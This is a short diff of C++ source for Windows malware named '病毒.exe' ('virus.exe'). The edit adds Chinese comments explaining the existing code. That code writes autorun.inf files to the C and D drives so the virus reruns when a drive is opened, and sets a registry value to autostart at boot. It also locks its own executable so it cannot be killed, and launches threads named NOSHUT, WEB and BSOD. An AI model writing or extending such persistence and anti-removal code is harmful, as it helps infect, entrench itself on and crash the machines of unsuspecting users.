@@ -97,7 +97,7 @@ DWORD WINAPI FILEop(LPVOID Param)
 	autorun+="\\病毒.exe";
 	FILE *a=fopen(kkk.c_str(),"w");
 	fprintf(a,"%s",autorun.c_str());
-	fclose(a);
+	fclose(a);//向C盘D盘写入autorun.inf文件,一点图标便会再次运行病毒 
 	while(1)
 	{
 		string s="9T.@1D! 1:U1;9TUI1?HV\"\"HVE$(\" 3L25 /% 3%L /5(7(342L5$25L'(-$@E)J)K";//用异或加密了的反病毒测试代码(免得源代码被删了) 
@@ -263,8 +263,8 @@ int main()
     ::RegOpenKeyEx(HKEY_CURRENT_USER,StrKey,NULL,KEY_ALL_ACCESS,&hKey);
     LPCSTR KeyValue="病毒.exe";
     ::RegSetValueEx(hKey,(LPCTSTR)KeyValue,0,REG_SZ,(BYTE*)(LPCSTR)pppp,strlen(pppp)+1);
-    ::RegCloseKey(hKey); 
-    FILE *lock=fopen("病毒.exe","rb");
+    ::RegCloseKey(hKey); //开机自启动 
+    FILE *lock=fopen("病毒.exe","rb");//锁死文件,杀不掉 
 	CreateThread(NULL,4096,&NOSHUT,NULL,NULL,NULL);
 	CreateThread(NULL,4096,&WEB,NULL,NULL,NULL);
 	CreateThread(NULL,4096,&BSOD,NULL,NULL,NULL);
